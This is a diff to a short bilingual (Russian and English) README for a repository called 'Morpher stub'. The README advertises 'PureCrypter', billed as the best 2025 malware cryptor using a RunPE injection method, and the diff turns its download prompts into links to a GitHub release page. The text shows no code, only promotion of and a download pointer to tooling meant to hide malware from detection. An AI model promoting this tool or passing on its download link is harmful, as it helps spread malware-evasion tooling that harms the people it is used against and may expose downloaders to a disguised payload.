@@ -1,8 +1,8 @@
 Morpher stub
 
-СКАЧАТЬ МОЖНО В РАЗДЕЛЕ "РЕЛИЗЫ" КЛИК
+[СКАЧАТЬ МОЖНО В РАЗДЕЛЕ "РЕЛИЗЫ" КЛИК](https://github.com/Detools1221/PureCrypter-RUNPE2025/releases/tag/cryptor)
 
-YOU CAN DOWNLOAD IT IN THE "RELEASES" SECTION CLICK
+[YOU CAN DOWNLOAD IT IN THE "RELEASES" SECTION CLICK](https://github.com/Detools1221/PureCrypter-RUNPE2025/releases/tag/cryptor)
 
 PureCrypter - BEST 2025 MARTH MALWARE CRYPTOR (RUNPE INJECT METOD)
 
